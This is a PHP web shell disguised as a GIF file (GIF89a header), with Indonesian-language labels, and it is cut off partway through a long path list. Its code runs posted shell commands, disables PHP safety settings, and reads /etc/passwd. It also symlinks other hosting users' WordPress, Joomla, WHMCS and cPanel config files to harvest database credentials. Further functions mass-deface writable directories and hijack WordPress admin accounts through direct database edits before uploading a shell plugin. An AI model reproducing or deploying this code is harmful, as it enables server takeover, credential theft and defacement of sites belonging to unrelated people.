GIF89a
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<center>
<style>

body {
  background: url(https://media2.giphy.com/media/AWvasQ7DgzLXO/giphy.gif) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
  color: rgba(255, 255, 255, 0.25);
  text-align: center;
  margin: 0;
  
  }
</style>


<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
$asui = getcwd() . "/";
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$ini = "fopen";
$fw = "fwrite";
$ada = "function_exists";
$crot = "shell_exec";
if (isset($_POST['cmd'])) {
    $mulai = $ini('php.ini', 'w');
    $buat = " safe_mode = OFF n
disable_functions = NONE n
safe_mode_gid = OFF n
open_basedir = OFF n
register_globals = ON n
exec = ON n
shell_exec = ON n";
    $fw($mulai, $buat);
    if ($ada('shell_exec')) {
        $lihat = $_POST['cmd'];
        $hasil = $crot("$lihat");
        echo "<pre>$hasil</pre>";
    }
    
}

if($_GET['do'] == 'config') {
@ini_set('max_execution_time',0); 
@ini_set('display_errors', 0); 
@ini_set('file_uploads',1);
echo '<form method="POST"><textarea cols="30" name="passwd"  rows="10">'; 
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) { 
$str=explode(":",$usrr); echo $str[0]."\n"; } 
echo'</textarea><br><input type="hidden" class="input" name="folfig" value="taek" size=40 />
<select class="inp"  title="Select Your Type File"  name="type" size=""><option title="type txt" value=".txt">.txt<option><option title="type php" value=".php">.php<option><option title="type shtml" value=".shtml">.shtml<option><option title="type ini" value=".ini">.ini<option></select>
<input name="conf" size="80" class="ipt" value="Hajar..." type="submit"><br><br></form></center>';}
if ($_POST['conf']) {
$folfig = $_POST['folfig']; $type = $_POST['type'];
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess="
Options Indexes FollowSymLinks
\nDirectoryIndex .my.cnf
\nAddType txt .php
\nAddType txt .my.cnf
\nAddType txt .accesshash
\nAddHandler txt .php
\nAddHandler txt .cnf
\nAddHandler txt .accesshash
";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]); echo "<blink><center >tunggu sebentar ya ...</center></blink>";
foreach($passwd as $pwd){ $user=trim($pwd);
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vBulletin1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-vBulletin3.txt');
@symlink('/home/'.$user.'/public_html/cc/includes/config.php',$user.'-vBulletin4.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-Phpbb1.txt');
@symlink('/home/'.$user.'/public_html/forum/includes/config.php',$user.'-Phpbb2.txt');
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-Wordpress1.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress2.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-Joomla1.txt');
@symlink('/home/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla2.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla3.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-Whm1.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-Whm2.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-Whm3.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-Whm4.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-Whm5.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-Whm6.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-Whm7.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-Whm8.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-Whm9.txt');
@symlink('/home/'.$user.'/public_html/admin/conf.php',$user.'-5.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-4.txt');
@symlink('/home/'.$user.'/public_html/conf_global.php',$user.'-invisio.txt');
@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-7.txt');
@symlink('/home/'.$user.'/public_html/connect.php',$user.'-8.txt');
@symlink('/home/'.$user.'/public_html/mk_conf.php',$user.'-mk-portale1.txt');
@symlink('/home/'.$user.'/public_html/include/config.php',$user.'-12.txt');
@symlink('/home/'.$user.'/public_html/settings.php',$user.'-Smf.txt');
@symlink('/home/'.$user.'/public_html/includes/functions.php',$user.'-phpbb3.txt');
@symlink('/home/'.$user.'/public_html/include/db.php',$user.'-infinity.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-cpanel.txt');
@symlink('/home/'.$user.'/.accesshash',$user.'-whm.txt');
@symlink('/home/'.$user.'/public_html/admin/config.php',$user.'-opencart.txt');
@symlink('/home/'.$user.'/public_html/slconfig.php',$user.'-sitelok.txt');
@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-elislab.txt');
@symlink('/home/'.$user.'/public_html/app/etc/local.xml',$user.'-mangentot.txt');
@symlink('/home/'.$user.'/public_html/config/koneksi.php',$user.'-lokmed.txt');
@symlink('/home/'.$user.'/public_html/po-library/po-config.php',$user.'-popojembut.txt');
@symlink('/home/'.$user.'/public_html/lokomedia/config/koneksi.php',$user.'-lokmed.txt');
echo '<center>Selesai mas/mba bro untuk melihat hasilnya klik -> <blink><a href='.$folfig.'>'.$folfig.'</a></blink>';

}
}
if($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$asui' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by ./IzunaWeb & Madara</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
}
if($_GET['do'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a><br>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a><br>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$web_vh = "/var/www/vhosts/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a><br>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a><br>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)){
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a><br>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}
if($_GET['do'] == 'wpm') {
echo "


<center><h1>Kontooooooooooooool</h1>
		<form method='post'>
		<textarea name='link' placeholder='http://target.com/peli_gedi/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' value='Hacked by IDBTE4M' required><br>
		
		<input type='submit' style='width: 450px;' name='ancuki' value='Hajar!!'>
		</form></center>";
if($_POST['ancuki']) {
	function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

	function anucurl($sites){
		$ch1 = curl_init ("$sites");
    curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
    curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
    $data = curl_exec ($ch1);
    return $data;
	}

	function lohgin($cek, $web, $userr, $pass){
		$post = array(
					"log" => "$userr",
					"pwd" => "$pass",
					"rememberme" => "forever",
					"wp-submit" => "Log In",
					"redirect_to" => "$web/wp-admin/plugin-install.php?tab=upload",
					"testcookie" => "1",
					);
$ch = curl_init ("$cek");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data6 = curl_exec ($ch);
return $data6;
	}
$link = explode("\r\n", $_POST['link']);
$script = htmlspecialchars($_POST['script']);
$user = "kefiex";
$pass = "./kefiex404";
$passx = md5($pass);
		foreach($link as $dir_config) {
	        $config = anucurl($dir_config);
			$dbhost = ambilkata($config,"DB_HOST', '","'");
			$dbuser = ambilkata($config,"DB_USER', '","'");
			$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
			$dbname = ambilkata($config,"DB_NAME', '","'");
			$dbprefix = ambilkata($config,"table_prefix  = '","'");
			$prefix = $dbprefix."users";
			$option = $dbprefix."options";
			$conn = mysql_connect($dbhost,$dbuser,$dbpass);
			$db = mysql_select_db($dbname);
			$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
			$result = mysql_fetch_array($q);
			$id = $result[ID];
			$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
			$result2 = mysql_fetch_array($q2);
			$target = $result2[option_value];
			if($target == '') {					
				echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
			} else {
				echo "[+] $target <br>";
			}
			$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
			if(!$conn OR !$db OR !$update) {
				echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
				mysql_close($conn);
			} else {



$site= "$target/wp-login.php";
$site2= "$target/wp-admin/plugin-install.php?tab=upload";
$a = lohgin($site, $target, $user, $pass);
$b = lohgin($site2, $target, $user, $pass);
			

$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
echo "# Db Host: $dbhost<br>";
echo "# Db user: $dbuser<br>";
echo "# Db Password: $dbpass<br>";
echo "# Db name: $dbname<br>";
echo "# Table_Prefix: $dbprefix<br>";
echo "# token -> $anu2<br>";
$plug = "peli.zip";
    
  $post2 = array(
					"_wpnonce" => "$anu2",
					"_wp_http_referer" => "/wp-admin/plugin-install.php?tab=upload",
					"pluginzip" => "@$plug",
					"install-plugin-submit" => "Install Now",
					);
$ch = curl_init ("$target/wp-admin/update.php?action=upload-plugin");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);
$as = "$target/wp-content/plugins/peli/5.php";
$bs = file_get_contents($as);
 if(preg_match("#Dr SH3LL#si",$bs)){
                        echo "# <font color='green'>berhasil mepes...</font><br>";
                        echo "# $target/wp-content/plugins/peli/5.php<br>";
                    }
                    else{
                        echo "# <font color='red'>gagal mepes...</font><br>";
                        echo "# coba aja manual: <br>";
                        echo "# $target/wp-login.php<br>";
                        echo "# username: $user<br>";
                        echo "# password: $pass<br>";

                       
                    }




		

			}

			
		}
	
	}else{
			
		}
}
if($_GET['do'] == 'config2') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("kuontol_symvhosts", 0777);
exe("ln -s / kuontol_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex kuontol.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("kuontol_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php kuontol_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php kuontol_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php kuontol_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php kuontol_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php kuontol_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php kuontol_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml kuontol_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php kuontol_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php kuontol_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("kuontol_symconfig", 0777);
@symlink("/","kuontol_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex kuontol.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("kuontol_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("kuontol_sym404", 0777);
@symlink("/","kuontol_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex kuontol.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*kuontol_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("kuontol_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("kuontol_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("kuontol_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_kuontol) {
$grab_config = array(
"/home/$user_kuontol/.accesshash" => "WHM-accesshash",
"/home/$user_kuontol/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_kuontol/public_html/forum/config.php" => "phpBB",
"/home/$user_kuontol/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_kuontol/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_kuontol/public_html/app/etc/local.xml" => "Magento",
"/home/$user_kuontol/public_html/admin/config.php" => "OpenCart",
"/home/$user_kuontol/public_html/application/config/database.php" => "Ellislab",
"/home/$user_kuontol/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_kuontol/public_html/includes/config.php" => "Vbulletin",
"/home/$user_kuontol/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_kuontol/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_kuontol/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_kuontol/public_html/inc/config.php" => "MyBB",
"/home/$user_kuontol/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_kuontol/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_kuontol/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_kuontol/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_kuontol/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_kuontol/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_kuontol/public_html/inc/conf_global.php" => "IPB",
"/home/$user_kuontol/public_html/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_kuontol/public_html/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/blog/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/submitticket.php" => "^WHMCS",
"/home/$user_kuontol/public_html/cms/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/beta/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/portal/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/site/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/main/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/home/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/demo/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/test/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/v1/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/v2/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/new/configuration.php" => "Joomla",
"/home/$user_kuontol/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_kuontol/public_html/user/submitticket.php" => "WHMCS",
